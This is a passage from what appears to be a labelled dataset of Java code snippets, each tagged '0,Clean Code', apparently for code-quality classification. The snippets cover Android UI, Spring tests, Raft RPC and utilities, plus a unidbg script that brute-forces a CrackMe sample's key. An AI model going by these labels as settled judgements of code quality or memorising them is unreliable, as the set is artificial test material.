  @Override protected boolean getSwitchBarCheckState(){
    return ThanosManager.from(getApplicationContext()).isServiceInstalled() && ThanosManager.from(getApplicationContext()).getNotificationManager().isScreenOnNotificationEnabled();
  }
  @Override protected void onSwitchBarCheckChanged(  com.google.android.material.materialswitch.MaterialSwitch switchBar,  boolean isChecked){
    super.onSwitchBarCheckChanged(switchBar,isChecked);
    ThanosManager.from(getApplicationContext()).ifServiceInstalled(thanosManager -> thanosManager.getNotificationManager().setScreenOnNotificationEnabled(isChecked));
  }
}
",0,Clean Code
"/** 
 * A task that can be  {@link Segment#doTask run} against a {@link Segment}.
 */
private abstract class Task<T> {
  private final EnumSet<TaskOption> options;
  public Task(  TaskOption... options){
    this.options=(options.length == 0 ? EnumSet.noneOf(TaskOption.class) : EnumSet.of(options[0],options));
  }
  public boolean hasOption(  TaskOption option){
    return this.options.contains(option);
  }
  /** 
 * Execute the task.
 * @param reference the found reference or {@code null}
 * @param entry     the found entry or {@code null}
 * @param entries   access to the underlying entries
 * @return the result of the task
 * @see #execute(Reference,Entry)
 */
  protected T execute(  Reference<K,V> reference,  Entry<K,V> entry,  Entries entries){
    return execute(reference,entry);
  }
  /** 
 * Convenience method that can be used for tasks that do not need access to  {@link Entries}.
 * @param reference the found reference or {@code null}
 * @param entry     the found entry or {@code null}
 * @return the result of the task
 * @see #execute(Reference,Entry,Entries)
 */
  protected T execute(  Reference<K,V> reference,  Entry<K,V> entry){
    return null;
  }
}
",0,Clean Code
"/** 
 * An  {@link OutputStream} implementation that performs an additional action right <b>after</b> the base stream got closed.
 */
public class OnCloseOutputStream extends DelegateOutputStream {
  private final AutoCloseable onClose;
  public OnCloseOutputStream(  OutputStream out,  AutoCloseable onClose){
    super(out);
    this.onClose=onClose;
  }
  @Override public void close() throws IOException {
    IOException ioExcetion=null;
    try {
      super.close();
    }
 catch (    IOException ex) {
      ioExcetion=ex;
    }
    try {
      onClose.close();
    }
 catch (    Exception ex) {
      if (ioExcetion == null) {
        if (ex instanceof IOException) {
          ioExcetion=(IOException)ex;
        }
 else {
          ioExcetion=new IOException(ex);
        }
      }
 else {
        ioExcetion.addSuppressed(ex);
      }
    }
    if (ioExcetion != null)     throw ioExcetion;
  }
}
",0,Clean Code
"/** 
 * Simple utility to work with Java collections.
 */
public final class CollectionUtil {
  /** 
 * A safe maximum size for arrays in the JVM.
 */
  public static final int MAX_ARRAY_SIZE=Integer.MAX_VALUE - 8;
  private CollectionUtil(){
    throw new AssertionError();
  }
  public static boolean isNullOrEmpty(  Collection<?> collection){
    return collection == null || collection.isEmpty();
  }
  public static boolean isNullOrEmpty(  Map<?,?> map){
    return map == null || map.isEmpty();
  }
  public static <T,R>Stream<R> mapWithIndex(  Collection<T> input,  final BiFunction<T,Integer,R> mapper){
    final AtomicInteger count=new AtomicInteger(0);
    return input.stream().map(element -> mapper.apply(element,count.getAndIncrement()));
  }
  /** 
 * Partition a collection into approximately n buckets.
 */
  public static <T>Collection<List<T>> partition(  Collection<T> elements,  int numBuckets){
    Map<Integer,List<T>> buckets=new HashMap<>(numBuckets);
    int initialCapacity=elements.size() / numBuckets;
    int index=0;
    for (    T element : elements) {
      int bucket=index % numBuckets;
      buckets.computeIfAbsent(bucket,key -> new ArrayList<>(initialCapacity)).add(element);
    }
    return buckets.values();
  }
}
",0,Clean Code
"/** 
 * A simple JDBC-based implementation of the  {@link VisitRepository} interface.
 * @author Ken Krebs
 * @author Juergen Hoeller
 * @author Rob Harrop
 * @author Sam Brannen
 * @author Thomas Risberg
 * @author Mark Fisher
 * @author Michael Isvy
 */
@Repository public class JdbcVisitRepositoryImpl implements VisitRepository {
  private NamedParameterJdbcTemplate jdbcTemplate;
  private SimpleJdbcInsert insertVisit;
  @Autowired public JdbcVisitRepositoryImpl(  DataSource dataSource){
    this.jdbcTemplate=new NamedParameterJdbcTemplate(dataSource);
    this.insertVisit=new SimpleJdbcInsert(dataSource).withTableName(""visits"").usingGeneratedKeyColumns(""id"");
  }
  @Override public void save(  Visit visit) throws DataAccessException {
    if (visit.isNew()) {
      Number newKey=this.insertVisit.executeAndReturnKey(createVisitParameterSource(visit));
      visit.setId(newKey.intValue());
    }
 else {
      throw new UnsupportedOperationException(""Visit update not supported"");
    }
  }
  /** 
 * Creates a  {@link MapSqlParameterSource} based on data values from thesupplied  {@link Visit} instance.
 */
  private MapSqlParameterSource createVisitParameterSource(  Visit visit){
    return new MapSqlParameterSource().addValue(""id"",visit.getId()).addValue(""visit_date"",visit.getDate()).addValue(""description"",visit.getDescription()).addValue(""pet_id"",visit.getPetId());
  }
  @Override public List<Visit> findByPetId(  Integer petId){
    Map<String,Object> params=new HashMap<>();
    params.put(""id"",petId);
    Pet pet=this.jdbcTemplate.queryForObject(""SELECT id, name, birth_date, type_id, owner_id FROM pets WHERE id=:id"",params,new JdbcPetRowMapper());
    List<Visit> visits=this.jdbcTemplate.query(""SELECT id as visit_id, visit_date, description FROM visits WHERE pet_id=:id"",params,new JdbcVisitRowMapper());
    for (    Visit visit : visits) {
      visit.setPetId(pet.getId());
    }
    return visits;
  }
}
",0,Clean Code
"/** 
 * {@code LocalParameterServer} is an implementation of the {@code ParameterServer} interface. 
 */
public class LocalParameterServer implements ParameterServer {
  private Optimizer optimizer;
  /** 
 * Create a new instance of  {@code LocalParameterServer} for the given optimizer.
 * @param optimizer an optimizer
 */
  public LocalParameterServer(  Optimizer optimizer){
    this.optimizer=optimizer;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void init(  String parameterId,  NDArray[] value){
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void update(  String parameterId,  NDArray[] grads,  NDArray[] params){
    Device firstDevice=params[0].getDevice();
    for (int i=1; i < grads.length; i++) {
      try (NDArray gradCopy=grads[i].toDevice(firstDevice,true)){
        grads[0].addi(gradCopy);
      }
     }
    try (NDArray aggregatedGrad=grads[0].duplicate()){
      for (      NDArray param : params) {
        if (param.getDevice().equals(firstDevice)) {
          optimizer.update(parameterId,param,aggregatedGrad);
        }
 else {
          try (NDArray gradSumCopy=aggregatedGrad.toDevice(param.getDevice(),true)){
            optimizer.update(parameterId,param,gradSumCopy);
          }
         }
      }
    }
   }
  /** 
 * {@inheritDoc} 
 */
  @Override public void close(){
  }
}
",0,Clean Code
"/** 
 * QQ小程序登陆 Request 请求 <p> 参照微信小程序实现
 * @author hurentian
 * @since 2024-10-08
 */
public class AuthQQMiniProgramRequest extends AuthDefaultRequest {
  public AuthQQMiniProgramRequest(  AuthConfig config){
    super(config,AuthDefaultSource.QQ_MINI_PROGRAM);
  }
  public AuthQQMiniProgramRequest(  AuthConfig config,  AuthStateCache authStateCache){
    super(config,AuthDefaultSource.QQ_MINI_PROGRAM,authStateCache);
  }
  @Override public AuthToken getAccessToken(  AuthCallback authCallback){
    String response=new HttpUtils(config.getHttpConfig()).get(accessTokenUrl(authCallback.getCode())).getBody();
    JSCode2SessionResponse accessTokenObject=JSONObject.parseObject(response,JSCode2SessionResponse.class);
    assert accessTokenObject != null;
    checkResponse(accessTokenObject);
    return AuthToken.builder().openId(accessTokenObject.getOpenid()).unionId(accessTokenObject.getUnionId()).accessToken(accessTokenObject.getSessionKey()).build();
  }
  @Override public AuthUser getUserInfo(  AuthToken authToken){
    return AuthUser.builder().username("""").nickname("""").avatar("""").uuid(authToken.getOpenId()).token(authToken).source(source.toString()).build();
  }
  /** 
 * 检查响应内容是否正确
 * @param response 请求响应内容
 */
  private void checkResponse(  JSCode2SessionResponse response){
    if (response.getErrorCode() != 0) {
      throw new AuthException(response.getErrorCode(),response.getErrorMsg());
    }
  }
  @Override protected String accessTokenUrl(  String code){
    return UrlBuilder.fromBaseUrl(source.accessToken()).queryParam(""appid"",config.getClientId()).queryParam(""secret"",config.getClientSecret()).queryParam(""js_code"",code).queryParam(""grant_type"",""authorization_code"").build();
  }
@Data @SuppressWarnings(""SpellCheckingInspection"") private static class JSCode2SessionResponse {
    @JSONField(name=""errcode"") private int errorCode;
    @JSONField(name=""errmsg"") private String errorMsg;
    @JSONField(name=""session_key"") private String sessionKey;
    private String openid;
    @JSONField(name=""unionid"") private String unionId;
  }
}
",0,Clean Code
"public class SpringDocApp27Test extends AbstractSpringDocTest {
  @Test protected void testApp() throws Exception {
    mockMvc.perform(get(Constants.DEFAULT_API_DOCS_URL)).andExpect(status().isOk()).andExpect(jsonPath(""$.openapi"",is(""3.1.0""))).andExpect(jsonPath(""$.paths./test.get.responses.500.content.['*/*'].schema.oneOf"").isArray()).andExpect(jsonPath(""$.paths./test.get.responses.500.content.['*/*'].schema.oneOf[*].$ref"",containsInAnyOrder(""#/components/schemas/Bar"",""#/components/schemas/Foo"")));
  }
@SpringBootApplication static class SpringDocTestApp {
  }
}
/** 
 * The type Spring doc app 27 test.
 */
class SpringDocApp27Test extends AbstractSpringDocTest {
  /** 
 * Test app.
 * @throws Exception the exception
 */
  @Test protected void testApp() throws Exception {
    mockMvc.perform(get(Constants.DEFAULT_API_DOCS_URL)).andExpect(status().isOk()).andExpect(jsonPath(""$.openapi"",is(""3.1.0""))).andExpect(jsonPath(""$.paths./test.get.responses.500.content.['*/*'].schema.oneOf"").isArray()).andExpect(jsonPath(""$.paths./test.get.responses.500.content.['*/*'].schema.oneOf[*].$ref"",containsInAnyOrder(""#/components/schemas/Bar"",""#/components/schemas/Foo"")));
  }
  /** 
 * The type Spring doc test app.
 */
@SpringBootApplication static class SpringDocTestApp {
  }
}
@TestPropertySource(properties=""springdoc.model-converters.pageable-converter.enabled=false"") public class SpringDocApp27Test extends AbstractSpringDocTest {
static {
    Optional<ModelConverter> pageabeConverter=ModelConverters.getInstance(true).getConverters().stream().filter(modelConverter -> modelConverter instanceof PageableOpenAPIConverter).findAny();
    pageabeConverter.ifPresent(ModelConverters.getInstance(true)::removeConverter);
  }
@SpringBootApplication static class SpringDocTestApp {
  }
}
",0,Clean Code
"/** 
 * Process get all peers of the replication group request.
 * @author jiachun.fjc
 */
public class GetPeersRequestProcessor extends BaseCliRequestProcessor<GetPeersRequest> {
  public GetPeersRequestProcessor(  final Executor executor){
    super(executor,GetPeersResponse.getDefaultInstance());
  }
  @Override protected String getPeerId(  final GetPeersRequest request){
    return request.getLeaderId();
  }
  @Override protected String getGroupId(  final GetPeersRequest request){
    return request.getGroupId();
  }
  @Override protected Message processRequest0(  final CliRequestContext ctx,  final GetPeersRequest request,  final RpcRequestClosure done){
    final List<PeerId> peers;
    final List<PeerId> learners;
    if (request.hasOnlyAlive() && request.getOnlyAlive()) {
      peers=ctx.node.listAlivePeers();
      learners=ctx.node.listAliveLearners();
    }
 else {
      peers=ctx.node.listPeers();
      learners=ctx.node.listLearners();
    }
    final GetPeersResponse.Builder builder=GetPeersResponse.newBuilder();
    for (    final PeerId peerId : peers) {
      builder.addPeers(peerId.toString());
    }
    for (    final PeerId peerId : learners) {
      builder.addLearners(peerId.toString());
    }
    return builder.build();
  }
  @Override public String interest(){
    return GetPeersRequest.class.getName();
  }
}",0,Clean Code
"public interface AppendEntriesResponseOrBuilder extends com.google.protobuf.MessageOrBuilder {
  /** 
 * <code>required int64 term = 1;</code>
 */
  boolean hasTerm();
  /** 
 * <code>required int64 term = 1;</code>
 */
  long getTerm();
  /** 
 * <code>required bool success = 2;</code>
 */
  boolean hasSuccess();
  /** 
 * <code>required bool success = 2;</code>
 */
  boolean getSuccess();
  /** 
 * <code>optional int64 last_log_index = 3;</code>
 */
  boolean hasLastLogIndex();
  /** 
 * <code>optional int64 last_log_index = 3;</code>
 */
  long getLastLogIndex();
  /** 
 * <code>optional .jraft.ErrorResponse errorResponse = 99;</code>
 */
  boolean hasErrorResponse();
  /** 
 * <code>optional .jraft.ErrorResponse errorResponse = 99;</code>
 */
  com.alipay.sofa.jraft.rpc.RpcRequests.ErrorResponse getErrorResponse();
  /** 
 * <code>optional .jraft.ErrorResponse errorResponse = 99;</code>
 */
  com.alipay.sofa.jraft.rpc.RpcRequests.ErrorResponseOrBuilder getErrorResponseOrBuilder();
}",0,Clean Code
"/** 
 * A class that allows  {@link ResourceTranscoder}s to be registered and retrieved by the classes they convert between.
 */
public class TranscoderRegistry {
  private static final MultiClassKey GET_KEY=new MultiClassKey();
  private final Map<MultiClassKey,ResourceTranscoder<?,?>> factories=new HashMap<MultiClassKey,ResourceTranscoder<?,?>>();
  /** 
 * Registers the given  {@link ResourceTranscoder} using the givenclasses so it can later be retrieved using the given classes.
 * @param decodedClass The class of the resource that the transcoder transcodes from.
 * @param transcodedClass The class of the resource that the transcoder transcodes to.
 * @param transcoder The transcoder.
 * @param < Z > The type of the resource that the transcoder transcodes from.
 * @param < R > The type of the resource that the transcoder transcodes to.
 */
  public <Z,R>void register(  Class<Z> decodedClass,  Class<R> transcodedClass,  ResourceTranscoder<Z,R> transcoder){
    factories.put(new MultiClassKey(decodedClass,transcodedClass),transcoder);
  }
  /** 
 * Returns the currently registered  {@link ResourceTranscoder} for thegiven classes.
 * @param decodedClass The class of the resource that the transcoder transcodes from.
 * @param transcodedClass The class of the resource that the transcoder transcodes to.
 * @param < Z > The type of the resource that the transcoder transcodes from.
 * @param < R > The type of the resource that the transcoder transcodes to.
 */
  @SuppressWarnings(""unchecked"") public <Z,R>ResourceTranscoder<Z,R> get(  Class<Z> decodedClass,  Class<R> transcodedClass){
    if (decodedClass.equals(transcodedClass)) {
      return (ResourceTranscoder<Z,R>)UnitTranscoder.get();
    }
    final ResourceTranscoder<?,?> result;
synchronized (GET_KEY) {
      GET_KEY.set(decodedClass,transcodedClass);
      result=factories.get(GET_KEY);
    }
    if (result == null) {
      throw new IllegalArgumentException(""No transcoder registered for "" + decodedClass + "" and ""+ transcodedClass);
    }
    return (ResourceTranscoder<Z,R>)result;
  }
}
",0,Clean Code
"/** 
 * {@link InvokeAdvice} http请求感知；包含同步/异步调用<p>
 * @author zhaoyb1990
 */
public interface InvokeAdvice {
  /** 
 * 开启异步调用
 * @param request WrapperRequest
 * @see javax.servlet.http.HttpServletRequest#startAsync
 */
  void onStartAsync(  WrapperRequest request);
  /** 
 * 异步调用完成
 * @param request WrapperRequest
 * @param model   模型
 * @see AsyncContext#complete()
 */
  void onComplete(  WrapperRequest request,  WrapperTransModel model);
  /** 
 * 同步调用开始
 * @param request WrapperRequest
 * @param event   sandbox的before事件
 */
  void onRequest(  WrapperRequest request,  BeforeEvent event);
  /** 
 * 同步调用完成
 * @param request WrapperRequest
 * @param model   模型
 */
  void onResponse(  WrapperRequest request,  WrapperTransModel model);
}
",0,Clean Code
"/** 
 * <a href=""https://bbs.pediy.com/thread-263345.htm"">CrackMe</a>
 */
public class MainActivity {
  public static void main(  String[] args){
    long start=System.currentTimeMillis();
    MainActivity mainActivity=new MainActivity();
    System.out.println(""load offset="" + (System.currentTimeMillis() - start) + ""ms"");
    mainActivity.crack();
  }
  private final AndroidEmulator emulator;
  private final VM vm;
  private MainActivity(){
    emulator=AndroidEmulatorBuilder.for32Bit().addBackendFactory(new DynarmicFactory(true)).build();
    Memory memory=emulator.getMemory();
    LibraryResolver resolver=new AndroidResolver(23);
    memory.setLibraryResolver(resolver);
    vm=emulator.createDalvikVM();
    vm.setVerbose(false);
    DalvikModule dm=vm.loadLibrary(new File(""unidbg-android/src/test/resources/example_binaries/armeabi-v7a/libnative-lib.so""),false);
    dm.callJNI_OnLoad(emulator);
  }
  private static final char[] LETTERS={'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};
  private void crack(){
    DvmObject<?> obj=ProxyDvmObject.createObject(vm,this);
    long start=System.currentTimeMillis();
    for (    char a : LETTERS) {
      for (      char b : LETTERS) {
        for (        char c : LETTERS) {
          String str="""" + a + b+ c;
          boolean success=obj.callJniMethodBoolean(emulator,""jnitest(Ljava/lang/String;)Z"",str);
          if (success) {
            System.out.println(""Found: "" + str + "", off=""+ (System.currentTimeMillis() - start)+ ""ms"");
            return;
          }
        }
      }
    }
  }
}
",0,Clean Code
"@CommandLine.Command(name=""doc"",description=""Generate documentation for all plugins currently installed"") public class PluginDocCommand extends AbstractCommand {
  @Inject private ApplicationContext applicationContext;
  @CommandLine.Parameters(index=""0"",description=""Path to write documentation files"") private Path output=Paths.get(System.getProperty(""user.dir""),""docs"");
  @CommandLine.Option(names={""--core""},description=""Also write core tasks docs files"") private boolean core=false;
  @CommandLine.Option(names={""--icons""},description=""Also write icon for each task"") private boolean icons=false;
  @CommandLine.Option(names={""--schema""},description=""Also write JSON Schema for each task"") private boolean schema=false;
  @Override public Integer call() throws Exception {
    super.call();
    DocumentationGenerator documentationGenerator=applicationContext.getBean(DocumentationGenerator.class);
    List<RegisteredPlugin> plugins=core ? pluginRegistry().plugins() : pluginRegistry().externalPlugins();
    boolean hasFailures=false;
    for (    RegisteredPlugin registeredPlugin : plugins) {
      try {
        documentationGenerator.generate(registeredPlugin).forEach(s -> {
          File file=Paths.get(output.toAbsolutePath().toString(),s.getPath()).toFile();
          if (!file.getParentFile().exists()) {
            file.getParentFile().mkdirs();
          }
          try {
            Files.asCharSink(file,StandardCharsets.UTF_8).write(s.getBody());
            stdOut(""Generate doc in: {0}"",file);
            if (s.getIcon() != null && this.icons) {
              File iconFile=new File(file.getParent(),file.getName().substring(0,file.getName().lastIndexOf(""."")) + "".svg"");
              Files.asByteSink(iconFile).write(Base64.getDecoder().decode(s.getIcon().getBytes(StandardCharsets.UTF_8)));
              stdOut(""Generate icon in: {0}"",iconFile);
            }
            if (this.schema && s.getSchema() != null) {
              File jsonSchemaFile=new File(file.getParent(),file.getName().substring(0,file.getName().lastIndexOf(""."")) + "".json"");
              Files.asByteSink(jsonSchemaFile).write(JacksonMapper.ofJson().writeValueAsBytes(s.getSchema()));
              stdOut(""Generate json schema in: {0}"",jsonSchemaFile);
            }
          }
 catch (          IOException e) {
            throw new RuntimeException(e);
          }
        }
);
      }
 catch (      Error e) {
        stdErr(""Failure to generate documentation for plugin {0}: {1}"",registeredPlugin.name(),e);
        hasFailures=true;
      }
    }
    return hasFailures ? 1 : 0;
  }
}
",0,Clean Code
"public static class AndExpr extends KaitaiStruct {
  public static AndExpr fromFile(  String fileName) throws IOException {
    return new AndExpr(new ByteBufferKaitaiStream(fileName));
  }
  public AndExpr(  KaitaiStream _io){
    this(_io,null,null);
  }
  public AndExpr(  KaitaiStream _io,  MachO.CsBlob.Expr _parent){
    this(_io,_parent,null);
  }
  public AndExpr(  KaitaiStream _io,  MachO.CsBlob.Expr _parent,  MachO _root){
    super(_io);
    this._parent=_parent;
    this._root=_root;
    _read();
  }
  private void _read(){
    this.left=new Expr(this._io,this,_root);
    this.right=new Expr(this._io,this,_root);
  }
  private Expr left;
  private Expr right;
  private MachO _root;
  private MachO.CsBlob.Expr _parent;
  public Expr left(){
    return left;
  }
  public Expr right(){
    return right;
  }
  public MachO _root(){
    return _root;
  }
  public MachO.CsBlob.Expr _parent(){
    return _parent;
  }
}
",0,Clean Code
"/** 
 * Instruction format  {@code 11x}. See the instruction format spec for details.
 */
public final class Form11x extends InsnFormat {
  /** 
 * {@code non-null;} unique instance of this class 
 */
  public static final InsnFormat THE_ONE=new Form11x();
  /** 
 * Constructs an instance. This class is not publicly instantiable. Use  {@link #THE_ONE}.
 */
  private Form11x(){
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String insnArgString(  DalvInsn insn){
    RegisterSpecList regs=insn.getRegisters();
    return regs.get(0).regString();
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String insnCommentString(  DalvInsn insn,  boolean noteIndices){
    return """";
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int codeSize(){
    return 1;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public boolean isCompatible(  DalvInsn insn){
    RegisterSpecList regs=insn.getRegisters();
    return (insn instanceof SimpleInsn) && (regs.size() == 1) && unsignedFitsInByte(regs.get(0).getReg());
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public BitSet compatibleRegs(  DalvInsn insn){
    RegisterSpecList regs=insn.getRegisters();
    BitSet bits=new BitSet(1);
    bits.set(0,unsignedFitsInByte(regs.get(0).getReg()));
    return bits;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void writeTo(  AnnotatedOutput out,  DalvInsn insn){
    RegisterSpecList regs=insn.getRegisters();
    write(out,opcodeUnit(insn,regs.get(0).getReg()));
  }
}
",0,Clean Code
"class PinnedMessageListAdapter extends RecyclerView.Adapter<PinnedMessageViewHolder> {
  @NonNull @Override public PinnedMessageViewHolder onCreateViewHolder(  @NonNull ViewGroup parent,  int viewType){
    View view=LayoutInflater.from(parent.getContext()).inflate(R.layout.chat_group_pinned_item_view_layout,parent,false);
    return new PinnedMessageViewHolder(view);
  }
  @Override public void onBindViewHolder(  @NonNull PinnedMessageViewHolder holder,  int position){
    TUIMessageBean messageBean=messageBeanList.get(position);
    String messageAbstract=messageBean.onGetDisplayString();
    FaceManager.handlerEmojiText(holder.messageAbstractTv,messageAbstract,false);
    holder.messageSenderName.setText(messageBean.getUserDisplayName());
    holder.itemView.setOnClickListener(new OnClickListener(){
      @Override public void onClick(      View v){
        dismiss();
        groupChatPresenter.locateMessage(messageBean.getId(),new IUIKitCallback<Void>(){
          @Override public void onSuccess(          Void data){
          }
          @Override public void onError(          String module,          int errCode,          String errMsg){
            ToastUtil.toastShortMessage(holder.itemView.getContext().getString(R.string.locate_origin_msg_failed_tip));
          }
        }
);
      }
    }
);
    if (groupChatPresenter.canPinnedMessage()) {
      holder.clearButton.setVisibility(VISIBLE);
    }
 else {
      holder.clearButton.setVisibility(GONE);
    }
    holder.clearButton.setOnClickListener(new OnClickListener(){
      @Override public void onClick(      View v){
        groupChatPresenter.unpinnedMessage(messageBean,new TUICallback(){
          @Override public void onSuccess(){
          }
          @Override public void onError(          int errorCode,          String errorMessage){
            ToastUtil.toastShortMessage(errorMessage);
          }
        }
);
      }
    }
);
  }
  @Override public int getItemCount(){
    if (messageBeanList == null) {
      return 0;
    }
    return messageBeanList.size();
  }
}",0,Clean Code
"public class AboutActivity extends WfcBaseActivity {
  TextView infoTextView;
  protected void bindEvents(){
    super.bindEvents();
    findViewById(R.id.introOptionItemView).setOnClickListener(v -> intro());
    findViewById(R.id.agreementOptionItemView).setOnClickListener(v -> agreement());
    findViewById(R.id.privacyOptionItemView).setOnClickListener(v -> privacy());
  }
  protected void bindViews(){
    super.bindViews();
    infoTextView=findViewById(R.id.infoTextView);
  }
  @Override protected int contentLayout(){
    return R.layout.activity_about;
  }
  @Override protected void afterViews(){
    PackageManager packageManager=getPackageManager();
    try {
      PackageInfo packageInfo=packageManager.getPackageInfo(getPackageName(),PackageManager.GET_CONFIGURATIONS);
      String info=packageInfo.packageName + ""\n"" + packageInfo.versionCode+ "" ""+ packageInfo.versionName+ ""\n""+ ChatManager.Instance().getProtoRevision()+ ""\n""+ Config.IM_SERVER_HOST+ ""\n""+ AppService.APP_SERVER_ADDRESS+ ""\n"";
      if (AVEngineKit.isSupportConference()) {
        info+=""高级版音视频\n"";
      }
 else {
        info+=""多人版版音视频\n"";
        for (        String[] ice : Config.ICE_SERVERS) {
          info+=ice[0] + "" "" + ice[1]+ "" ""+ ice[2]+ ""\n"";
        }
      }
      infoTextView.setText(info);
    }
 catch (    PackageManager.NameNotFoundException e) {
      e.printStackTrace();
    }
  }
  public void intro(){
    WfcWebViewActivity.loadUrl(this,""野火IM功能介绍"",""https://docs.wildfirechat.cn/"");
  }
  public void agreement(){
    WfcWebViewActivity.loadUrl(this,""野火IM用户协议"",""https://www.wildfirechat.net/wildfirechat_user_agreement.html"");
  }
  public void privacy(){
    WfcWebViewActivity.loadUrl(this,""野火IM个人信息保护政策"",""https://www.wildfirechat.net/wildfirechat_user_privacy.html"");
  }
}
",0,Clean Code
"public class ScanUtils {
  public static int getNumOfLines(  String str){
    if (str == null || str.length() == 0) {
      return 0;
    }
    int lines=1;
    int len=str.length();
    for (int pos=0; pos < len; pos++) {
      char c=str.charAt(pos);
      if (c == '\r') {
        lines++;
        if (pos + 1 < len && str.charAt(pos + 1) == '\n') {
          pos++;
        }
      }
 else       if (c == '\n') {
        lines++;
      }
    }
    return lines;
  }
  public static int getFirstIndexSkippingLines(  String str,  Integer lines){
    if (str == null || str.length() == 0 || lines < 0) {
      return -1;
    }
    if (lines == 0) {
      return 0;
    }
    int curLineIdx=0;
    int len=str.length();
    for (int pos=0; pos < len; pos++) {
      char c=str.charAt(pos);
      if (c == '\r') {
        curLineIdx++;
        if (pos + 1 < len && str.charAt(pos + 1) == '\n') {
          pos++;
        }
      }
 else       if (c == '\n') {
        curLineIdx++;
      }
 else {
        continue;
      }
      if (curLineIdx >= lines) {
        return pos + 1;
      }
    }
    return -1;
  }
}",0,Clean Code
"/** 
 * This class checks whether a given usage mark is caused by a given class or a member of a given class, directly or indirectly.
 */
private class MyReferenceChecker implements ClassVisitor, MemberVisitor {
  private Clazz checkClass;
  private boolean checkMember;
  private boolean isReferencing;
  public boolean referencesClass(  ShortestUsageMark shortestUsageMark,  Clazz clazz){
    checkClass=clazz;
    checkMember=false;
    isReferencing=false;
    checkReferenceFrom(shortestUsageMark);
    return isReferencing;
  }
  public boolean referencesClassMember(  ShortestUsageMark shortestUsageMark,  Clazz clazz){
    checkClass=clazz;
    checkMember=true;
    isReferencing=false;
    checkReferenceFrom(shortestUsageMark);
    return isReferencing;
  }
  @Override public void visitAnyClass(  Clazz clazz){
  }
  @Override public void visitProgramClass(  ProgramClass programClass){
    checkReferenceFrom(programClass);
  }
  public void visitLibraryField(  LibraryClass libraryClass,  LibraryField libraryField){
  }
  public void visitLibraryMethod(  LibraryClass libraryClass,  LibraryMethod libraryMethod){
  }
  public void visitProgramField(  ProgramClass programClass,  ProgramField programField){
    checkReferenceFrom(programField);
  }
  public void visitProgramMethod(  ProgramClass programClass,  ProgramMethod programMethod){
    checkReferenceFrom(programMethod);
  }
  private void checkReferenceFrom(  Processable processable){
    if (!isReferencing) {
      checkReferenceFrom(getShortestUsageMark(processable));
    }
  }
  private void checkReferenceFrom(  ShortestUsageMark shortestUsageMark){
    isReferencing=checkMember ? shortestUsageMark.isCausedByMember(checkClass) : shortestUsageMark.isCausedBy(checkClass);
    shortestUsageMark.acceptClassVisitor(this);
    shortestUsageMark.acceptMemberVisitor(this);
  }
}
",0,Clean Code
"/** 
 * An  {@link AbstractEmbedding} where each embedded item can be assigned an integer index.
 * @param < T > the type of the item that should be embedded
 */
public interface AbstractIndexedEmbedding<T> extends AbstractEmbedding<T> {
  /** 
 * Encodes an object of input type into a byte array. This is used in saving and loading the {@link Embedding} objects.
 * @param input the input object to be encoded
 * @return the encoded byte array.
 * @throws IOException if there is an error while encoding
 */
  byte[] encode(  T input) throws IOException ;
  /** 
 * Decodes the given byte array into an object of input parameter type.
 * @param byteArray the byte array to be decoded
 * @return the decode object of input parameter type
 * @throws IOException if there was an error while decoding
 */
  T decode(  byte[] byteArray) throws IOException ;
  /** 
 * Embeds an item.
 * @param item the item to embed
 * @return the index of the item in the embedding
 */
  long embed(  T item);
  /** 
 * Returns the item corresponding to the given index.
 * @param index the index
 * @return the item corresponding to the given index
 */
  Optional<T> unembed(  long index);
}
",0,Clean Code
"/** 
 * 获取当前请求的HttpServletRequest对象
 * @author geekidea
 * @date 2018-11-08
 */
public class HttpServletRequestUtil {
  /** 
 * 获取HttpServletRequest对象
 * @return
 */
  public static HttpServletRequest getRequest(){
    return ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest();
  }
  /** 
 * 判断是否是Knife4j或是Swagger接口文档访问的请求
 * @return
 */
  public static boolean isDocRequest(){
    return isDocRequest(getRequest());
  }
  /** 
 * 判断是否是Knife4j或是Swagger接口文档访问的请求
 * @param request
 * @return
 */
  public static boolean isDocRequest(  HttpServletRequest request){
    String requestOrigion=request.getHeader(RequestHeadConstant.REQUEST_ORIGION);
    String referer=request.getHeader(RequestHeadConstant.REFERER);
    boolean docRequest=false;
    if (CommonConstant.KNIFE4J.equals(requestOrigion)) {
      docRequest=true;
    }
 else     if (StringUtils.isNotBlank(referer) && referer.contains(CommonConstant.SWAGGER_UI_PATH)) {
      docRequest=true;
    }
    return docRequest;
  }
}",0,Clean Code
"/** 
 * Tests for  {@link InjectedFieldResolver}.
 * @author Stephane Nicoll
 */
class InjectedFieldResolverTests {
  private static final Field FIELD_STRING=ReflectionUtils.findField(TestBean.class,""string"",String.class);
  @Test void resolveDependency(){
    DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();
    beanFactory.registerSingleton(""one"",""1"");
    InjectedElementAttributes attributes=createResolver(TestBean.class,""string"",String.class).resolve(beanFactory,true);
    assertThat(attributes.isResolved()).isTrue();
    assertThat((String)attributes.get(0)).isEqualTo(""1"");
  }
  @Test void resolveRequiredDependencyNotPresentThrowsUnsatisfiedDependencyException(){
    DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();
    assertThatThrownBy(() -> createResolver(TestBean.class,""string"",String.class).resolve(beanFactory)).isInstanceOfSatisfying(UnsatisfiedDependencyException.class,(ex) -> {
      assertThat(ex.getBeanName()).isEqualTo(""test"");
      assertThat(ex.getInjectionPoint()).isNotNull();
      assertThat(ex.getInjectionPoint().getField()).isEqualTo(FIELD_STRING);
    }
);
  }
  @Test void resolveNonRequiredDependency(){
    DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();
    InjectedElementAttributes attributes=createResolver(TestBean.class,""string"",String.class).resolve(beanFactory,false);
    assertThat(attributes.isResolved()).isFalse();
  }
  private InjectedFieldResolver createResolver(  Class<?> beanType,  String fieldName,  Class<?> fieldType){
